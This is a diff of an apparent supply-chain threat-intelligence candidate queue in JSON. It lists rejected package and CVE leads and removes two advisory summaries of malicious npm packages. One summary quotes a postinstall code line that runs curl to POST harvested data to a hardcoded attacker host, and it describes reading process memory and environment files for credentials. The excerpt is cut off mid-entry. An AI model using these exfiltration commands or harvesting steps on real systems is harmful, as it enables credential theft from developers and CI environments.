@@ -1,6 +1,6 @@
 {
   "schema_version": "threatpedia-supply-chain-candidate-queue/1",
-  "generated_at": "2026-06-24T20:18:10.377Z",
+  "generated_at": "2026-06-24T21:54:10.369Z",
   "mode": "live",
   "drafting_enabled": false,
   "auto_drafting_allowed": false,
@@ -21,472 +21,584 @@
     "queue_path": ".github/pipeline/supply-chain-candidates/latest.json"
   },
   "summary": {
-    "raw_leads_loaded": 223,
-    "deduped_subjects": 208,
-    "rejected_low_relevance": 63,
+    "raw_leads_loaded": 236,
+    "deduped_subjects": 224,
+    "rejected_low_relevance": 79,
     "classifier_candidates": 145,
     "candidates_emitted": 40,
-    "candidates_carried_forward": 7,
+    "candidates_carried_forward": 8,
     "current_candidates": 40,
     "matched_existing": 2,
     "collector_errors": 0
   },
   "currency": {
     "latest_corpus_incident_at": "2026-05-28T00:00:00.000Z",
-    "latest_discovery_signal_at": "2026-06-24T19:01:26.493Z",
+    "latest_discovery_signal_at": "2026-06-24T21:32:22.000Z",
     "pending_candidate_count": 40,
     "pending_current_count": 40,
     "graph_latest_reflects": "discovery"
   },
   "feed_cursors": {
     "go": {
-      "cursor": "2026-06-24T10:41:14.763034Z",
+      "cursor": "2026-06-24T10:41:32.607784Z",
       "boundary_keys": [
-        "buf.build/gen/go/pocketsign/apis/protocolbuffers/go\tv1.36.1-20260619064626-e5e95b496fc2.1\t2026-06-24T10:41:14.763034Z"
+        "github.com/aikeylabs/aikey-control\tv1.0.1-alpha.2.0.20260622084607-737b6b8f31d5\t2026-06-24T10:41:32.607784Z"
       ]
     }
   },
   "collector_errors": [],
   "rejected": [
     {
-      "canonicalSubjectId": "pkg:npm/iplookup/country@1.0.20260623",
+      "canonicalSubjectId": "pkg:npm/muhkoo/cli@0.7.0-alpha.5",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:0009010fdf84"
+        "npm-registry:47dfcd14fc70"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/shieldcortex@4.42.0",
+      "canonicalSubjectId": "pkg:npm/muhkoo/connect@0.7.0-alpha.5",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:8cf0b0ca4a05"
+        "npm-registry:7b0355af25a7"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/westonfleming/ajsont@0.2.0",
+      "canonicalSubjectId": "pkg:npm/mapleflow/mcp-server@0.20.1",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:bbce943091ca"
+        "npm-registry:b42fb97fc72b"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/iplookup/country-extra@1.0.20260624",
+      "canonicalSubjectId": "pkg:npm/restora/cli@0.1.4",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:4120ba3f964c"
+        "npm-registry:5ab9e9be17a5"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/fiado/type-kit@3.107.0",
+      "canonicalSubjectId": "pkg:npm/sniipwebmaster/zenith-authorised-client-grpcweb@26.6.5727",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:ddef23efd469"
+        "npm-registry:cbc715f7d630"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/primer/react@38.29.0",
+      "canonicalSubjectId": "pkg:npm/smorken/aws-cdk@2.260.3",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:d0d6c2f42188"
+        "npm-registry:a8e1726f389d"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/n8n-nodes-cellystial@1.2.4",
+      "canonicalSubjectId": "pkg:npm/atlassian-test-prod/synth-check@1.0.103738",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:c481e565d2a7"
+        "npm-registry:9b6a99b7431e"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:npm/goyamegh/agent-health@0.5.23",
+      "canonicalSubjectId": "pkg:npm/lambdacurry/arbor@0.4.28",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "npm-registry:951f868404af"
+        "npm-registry:c1372eb2fee3"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/apache/tomcat-native@v0.0.0-20260623102956-10c98b6997fa",
+      "canonicalSubjectId": "pkg:npm/eve@0.13.6",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:c293587c1b50"
+        "npm-registry:762feafb9bdd"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/jubittajohn/library-go@v0.0.0-20260618132022-b0f5231f2ed6",
+      "canonicalSubjectId": "pkg:npm/stimulus-pdf-viewer@0.4.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:8b799e09aead"
+        "npm-registry:e3c0f2293d20"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/apereo/cas-overlay-template@v0.0.0-20260624032801-efa5d097d2f2",
+      "canonicalSubjectId": "pkg:npm/astryxdesign/cli@0.1.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:e73fc5209f07"
+        "npm-registry:1dbe4bd979f4"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/APA-Technology-Division/planning-technology-resources@v0.0.0-20260619214229-1dd84f55893c",
+      "canonicalSubjectId": "pkg:npm/astryxdesign/build@0.1.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:d5d74a392fcd"
+        "npm-registry:0ba400cc7246"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.1.0",
+      "canonicalSubjectId": "pkg:npm/fern-api/generator-cli@0.9.41",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:9caad114c344"
+        "npm-registry:85f447d008c2"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/go.opentelemetry.io/otel/metric@v1.44.1-0.20260624095433-76be4f71f576",
+      "canonicalSubjectId": "pkg:npm/animbox/mcp@0.4.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:313e0b4dfd63"
+        "npm-registry:a97b433b1138"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/mlupine/terraform-provider-pagerdutync@v1.4.2",
+      "canonicalSubjectId": "pkg:npm/tmustier/pi-session-hud@0.3.2",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:e5d39c4e800d"
+        "npm-registry:db891b52f30b"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/small-frappuccino/discordcore@v0.855.0-rc.1",
+      "canonicalSubjectId": "pkg:npm/bimpeai/sdk@0.4.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:c5cfdd21503b"
+        "npm-registry:66f7988e8373"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.1.1",
+      "canonicalSubjectId": "pkg:npm/cat-factory/worker@0.7.5",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:9e7df87d4c8d"
+        "npm-registry:2f79cde2f73b"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/wso2/carbon-apimgt@v9.33.15%2Bincompatible",
+      "canonicalSubjectId": "pkg:npm/cat-factory/node-server@0.7.5",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:e806dcc52c53"
+        "npm-registry:28f5b6ffd628"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/hashicorp/terraform@v1.16.0-alpha20260617.0.20260624103449-178e8feae4bc",
+      "canonicalSubjectId": "pkg:npm/pi-open-agents@0.1.1",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:e04eb62c55ce"
+        "npm-registry:c84e4885fba6"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.2.0",
+      "canonicalSubjectId": "pkg:npm/cat-factory/local-server@0.7.6",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:cddd91d0063f"
+        "npm-registry:2ce92d8cadff"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/mlupine/terraform-provider-pagerdutync@v1.0.0",
+      "canonicalSubjectId": "pkg:npm/cat-factory/workspaces@0.7.5",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:2dd3324048c1"
+        "npm-registry:2288ef3d6e35"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/apache/poi@v0.0.0-20260624084528-8a14abe262ec",
+      "canonicalSubjectId": "pkg:npm/cat-factory/spend@0.7.5",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:eaf76440a81b"
+        "npm-registry:3a451e099648"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/apexcharts/apexcharts.js@v5.15.2%2Bincompatible",
+      "canonicalSubjectId": "pkg:npm/agent-native/skills@0.2.82",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:0633f93c23c3"
+        "npm-registry:4353b17ad5e6"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/apache/ozhera@v2.2.6-incubating-rc1%2Bincompatible",
+      "canonicalSubjectId": "pkg:npm/cat-factory/agents@0.8.1",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:31cd42da2cd7"
+        "npm-registry:8e7612a01070"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/mlupine/terraform-provider-pagerdutync@v1.1.1",
+      "canonicalSubjectId": "pkg:golang/github.com/apollostack/graphql-tag@v2.12.7%2Bincompatible",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:53886f2d4e5c"
+        "go-index:e2a048375427"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/api-evangelist/level-3-communications@v0.0.0-20260620012705-6059360399cb",
+      "canonicalSubjectId": "pkg:golang/github.com/apache/tika@v0.0.0-20260624103400-47d2347a6610",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:c10f79ad0bbc"
+        "go-index:66602f8c4ef9"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/go.opentelemetry.io/otel/metric@v0.0.0-20260624095433-76be4f71f576",
+      "canonicalSubjectId": "pkg:golang/github.com/mlupine/terraform-provider-pagerdutync@v1.5.0",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:804506e410f2"
+        "go-index:ace0fab03666"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/go.opentelemetry.io/otel/trace@v1.44.1-0.20260624095433-76be4f71f576",
+      "canonicalSubjectId": "pkg:golang/go.opentelemetry.io/otel/trace@v0.0.0-20260624095433-76be4f71f576",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:f947fffc4dc7"
+        "go-index:8d4b1f954d07"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/apiguardian-team/apiguardian@v0.0.0-20260622145934-55c22edbab19",
+      "canonicalSubjectId": "pkg:golang/github.com/Aws/aws-sdk-go-v2/service/secretsmanager@v1.19.9",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:1fc022b439ff"
+        "go-index:457fa8b0ec54"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/mlupine/terraform-provider-pagerdutync@v1.3.1",
+      "canonicalSubjectId": "pkg:golang/github.com/apache/ozhera@v2.2.6-incubating%2Bincompatible",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:29a0963ecaad"
+        "go-index:b12cdc2aa712"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/apmantza/pi-webaio@v0.6.0",
+      "canonicalSubjectId": "pkg:golang/github.com/appium/appium-docker-android@v3.5.2-p0%2Bincompatible",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:fd71106726cd"
+        "go-index:939848e766c4"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/github.com/aporat/store-receipt-validator@v0.0.0-20260619030740-dd186c93641e",
+      "canonicalSubjectId": "pkg:golang/buf.build/gen/go/xmtp/proto/protocolbuffers/go@v1.36.2-20260618223123-e61687448568.1",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:544f1fa31ca8"
+        "go-index:775931e2d591"
       ]
     },
     {
-      "canonicalSubjectId": "pkg:golang/buf.build/gen/go/pocketsign/apis/protocolbuffers/go@v1.36.1-20260619064626-e5e95b496fc2.1",
+      "canonicalSubjectId": "pkg:golang/github.com/hashicorp/consul@v0.0.0-20260624102253-d8054696e622",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "go-index:2674f2c3381a"
+        "go-index:2b2ce52e779c"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2026-0769",
+      "canonicalSubjectId": "pkg:golang/github.com/mlupine/terraform-provider-pagerdutync@v1.7.2",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2026-0769"
+        "go-index:743570779994"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2021-28199",
+      "canonicalSubjectId": "pkg:golang/github.com/anaregdesign/lantern/core@v0.9.1-0.20260624073956-2b098d9a5f40",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2021-28199"
+        "go-index:2e13a76ec1c3"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2018-20334",
+      "canonicalSubjectId": "pkg:golang/github.com/apple/swift-docker@v0.0.0-20260623205241-8e17e09f4c3f",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2018-20334"
+        "go-index:68b892a14e88"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2023-0611",
+      "canonicalSubjectId": "pkg:golang/github.com/apple/sourcekit-lsp@v0.0.0-20260623210311-216609f51aef",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2023-0611"
+        "go-index:206c804f78fb"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-22254",
+      "canonicalSubjectId": "pkg:golang/github.com/apple/swift-async-algorithms@v0.0.0-20260623104118-c8a934923826",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-22254"
+        "go-index:de768141a1a0"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-9707",
+      "canonicalSubjectId": "pkg:golang/buf.build/gen/go/pocketsign/apis/protocolbuffers/go@v1.32.0-20260622095921-d8eedf82c0ae.1",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-9707"
+        "go-index:119864c0bcbb"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-22255",
+      "canonicalSubjectId": "pkg:golang/github.com/wso2/carbon-apimgt@v8.2.13%2Bincompatible",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-22255"
+        "go-index:f3403ffee2c4"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-30088",
+      "canonicalSubjectId": "pkg:golang/github.com/mlupine/terraform-provider-pagerdutync@v1.7.1",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-30088"
+        "go-index:edb3fbc62fe2"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2023-4320",
+      "canonicalSubjectId": "pkg:golang/github.com/apple/servicetalk@v0.0.0-20260623234935-09dc52b671d7",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2023-4320"
+        "go-index:466c23ed675b"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2021-39509",
+      "canonicalSubjectId": "pkg:golang/github.com/apple/swift-log@v0.0.0-20260623141537-a878e7f8f46c",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2021-39509"
+        "go-index:88093fc95dff"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-9680",
+      "canonicalSubjectId": "pkg:golang/github.com/apache/camel@v0.0.0-20260624102937-d31fde675c40",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-9680"
+        "go-index:05a80e134dba"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-23113",
+      "canonicalSubjectId": "pkg:golang/github.com/apple/swift-nio@v0.0.0-20260624085819-cd3e11520837",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-23113"
+        "go-index:a0f724dd8c2c"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-37383",
+      "canonicalSubjectId": "pkg:golang/github.com/apple/swift-testing@v0.0.0-20260624041647-91c0e8a8d1c8",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-37383"
+        "go-index:875dd7ffa744"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-43573",
+      "canonicalSubjectId": "pkg:golang/github.com/envoyproxy/go-control-plane/envoy@v0.0.0-20260624085653-52ac885e41c8",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-43573"
+        "go-index:95a62aed0eea"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-43572",
+      "canonicalSubjectId": "pkg:golang/github.com/mlupine/terraform-provider-pagerdutync@v1.4.1",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-43572"
+        "go-index:69320ba606f0"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-9381",
+      "canonicalSubjectId": "pkg:golang/github.com/aikeylabs/aikey-control@v1.0.1-alpha.2.0.20260622084607-737b6b8f31d5",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-9381"
+        "go-index:3b507cb68a9f"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-8911",
+      "canonicalSubjectId": "CVE-2021-27076",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-8911"
+        "vulncheck-kev:CVE-2021-27076"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2023-22069",
+      "canonicalSubjectId": "CVE-2024-9265",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2023-22069"
+        "vulncheck-kev:CVE-2024-9265"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-44849",
+      "canonicalSubjectId": "CVE-2024-45519",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-44849"
+        "vulncheck-kev:CVE-2024-45519"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-9379",
+      "canonicalSubjectId": "CVE-2012-2626",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-9379"
+        "vulncheck-kev:CVE-2012-2626"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-9380",
+      "canonicalSubjectId": "CVE-2019-0344",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-9380"
+        "vulncheck-kev:CVE-2019-0344"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-8943",
+      "canonicalSubjectId": "CVE-2024-8181",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-8943"
+        "vulncheck-kev:CVE-2024-8181"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-7679",
+      "canonicalSubjectId": "CVE-2024-9537",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-7679"
+        "vulncheck-kev:CVE-2024-9537"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-7576",
+      "canonicalSubjectId": "CVE-2024-47176",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-7576"
+        "vulncheck-kev:CVE-2024-47176"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-8752",
+      "canonicalSubjectId": "CVE-2024-47308",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-8752"
+        "vulncheck-kev:CVE-2024-47308"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-9014",
+      "canonicalSubjectId": "CVE-2024-2330",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-9014"
+        "vulncheck-kev:CVE-2024-2330"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-8316",
+      "canonicalSubjectId": "CVE-2024-4325",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-8316"
+        "vulncheck-kev:CVE-2024-4325"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-7575",
+      "canonicalSubjectId": "CVE-2024-7954",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-7575"
+        "vulncheck-kev:CVE-2024-7954"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-44068",
+      "canonicalSubjectId": "CVE-2015-8813",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-44068"
+        "vulncheck-kev:CVE-2015-8813"
       ]
     },
     {
-      "canonicalSubjectId": "CVE-2024-3080",
+      "canonicalSubjectId": "CVE-2012-4940",
       "reason": "not_supply_chain_relevant",
       "mergedLeadRefs": [
-        "vulncheck-kev:CVE-2024-3080"
+        "vulncheck-kev:CVE-2012-4940"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2016-1000149",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2016-1000149"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2020-27982",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2020-27982"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2022-0885",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2022-0885"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2011-4926",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2011-4926"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2008-2052",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2008-2052"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2023-25651",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2023-25651"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2019-2767",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2019-2767"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2014-9792",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2014-9792"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2021-23394",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2021-23394"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2014-8379",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2014-8379"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2005-3128",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2005-3128"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2015-4074",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2015-4074"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2024-38812",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2024-38812"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2020-9344",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2020-9344"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2008-6668",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2008-6668"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2019-8982",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2019-8982"
       ]
     }
   ],
@@ -600,120 +712,6 @@
       "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
     },
     {
-      "candidateId": "SC-CAND-ed6284dc16b40d22",
-      "canonicalSubjectId": "GHSA-J29F-62X7-HJ66",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malicious code in date-format-helper2 (npm)",
-      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (66c1775ce65ad47476ee1a0f1c7c5373e61466ec3eb4543cc658e67d2de22960) Package is advertised as a React date-formatting utility, but its postinstall.js performs targeted credential harvesting on npm install. The script reads Coze workload identity environment variables (COZE_WORKLOAD_API_TOKEN, COZE_WORKLOAD_IDENTITY_CLIENT_ID, COZE_WORKLOAD_IDENTITY_CLIENT_SECRET, COZE_WORKLOAD_IDENTITY_TOKEN_ENDPOINT, COZE_PROJECT_SPACE_ID), uses them to mint OAuth access tokens via three grant types (client_credentials, token-exchange, and a JSON body variant) against the configured token endpoint, enumerates ~30 Coze API paths against api.coze.cn / integration.coze.cn / api.coze.com using the minted tokens, and POSTs the env values, the issued tokens, and the API responses over plaintext HTTP to http://2e3bkumw.requestrepo.com — a public request-capture sinkhole controlled by the attacker. The advertised date-helper functionality in index.js is unrelated cover for the install-time credential theft. An installer running `npm install` in CI or a developer environment with Coze credentials in scope would have their workload identity stolen and the attacker could impersonate that workload against Coze APIs. ## Source: ghsa-malware (a13b8fd2717f710497955f390bdf36a5b52abda37b7f3bd47f737f98bfbbb5b4) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
-      "sources": [
-        "github-advisory",
-        "osv"
-      ],
-      "sourceRefs": [
-        "https://osv.dev/vulnerability/MAL-2026-6301",
-        "https://github.com/advisories/GHSA-j29f-62x7-hj66"
-      ],
-      "mergedLeadRefs": [
-        "github-advisory:GHSA-j29f-62x7-hj66",
-        "osv:MAL-2026-6301"
-      ],
-      "firstSeenAt": "2026-06-23T15:21:06.000Z",
-      "lastMaterialActivityAt": "2026-06-24T15:31:25.453Z",
-      "activityBasis": [
-        "advisory_updated",
-        "active_exploitation_or_malware_signal"
-      ],
-      "entityMatch": "new",
-      "matchedEntityHints": {
-        "actors": [],
-        "campaigns": [],
-        "packages": [],
-        "malwareFamilies": []
-      },
-      "classification": {
-        "leadClass": "current",
-        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
-        "workIntent": "create_article",
-        "routingPriority": "p0",
-        "effectiveActiveStatus": "exploited_in_wild",
-        "activeStatus": "exploited_in_wild",
-        "activeStatusExpiresAt": "2026-07-24T15:31:25.453Z",
-        "needsReverify": false,
-        "kevStatusDerived": null,
-        "kevStatusIsAuthoredTruth": false,
-        "manualOverrideValid": false,
-        "manualOverrideErrors": []
-      },
-      "rank": 71,
-      "rankReasons": [
-        "current lead",
-        "active exploitation or malware signal",
-        "advisory database signal",
-        "supply-chain term match"
-      ],
-      "queueAction": "candidate_review",
-      "draftingAllowed": false,
-      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
-    },
-    {
-      "candidateId": "SC-CAND-d937e144c2fd20d0",
-      "canonicalSubjectId": "GHSA-9P56-XFQ3-77X5",
-      "subjectType": "incident",
-      "proposedArchetype": "incident",
-      "title": "Malicious code in react-simple-utils-kit (npm)",
-      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (038aa6bccd8008fec1f309d718e53dd4b89e4ca15a976c6a80652e0dd58a5b58) Package advertises itself as 'a simple date formatting utility for React projects' (3-function index.js), but ships a postinstall.js that runs on every `npm install` and performs an extensive reconnaissance + credential-harvest sweep against the installer's host, POSTing each result over plain HTTP to a hardcoded attacker endpoint at http://2e3bkumw.requestrepo.com (a one-shot request-interception domain unrelated to any legitimate publisher). postinstall.js:8 hardcodes `const BURL = 'http://2e3bkumw.requestrepo.com'` and postinstall.js:16 invokes `execSync(\\`curl -s -m 8 -X POST -d @${tmpFile} ${BURL}/${key}...\\`)` to ship results. Collected data includes: process capabilities and ptrace scope, strace attach against PID 2, raw memory reads of another process via `xxd /proc/2/mem`, that process's environment block via `cat /proc/2/environ` (commonly containing CI tokens and cloud credentials), `/proc/2/cmdline`, 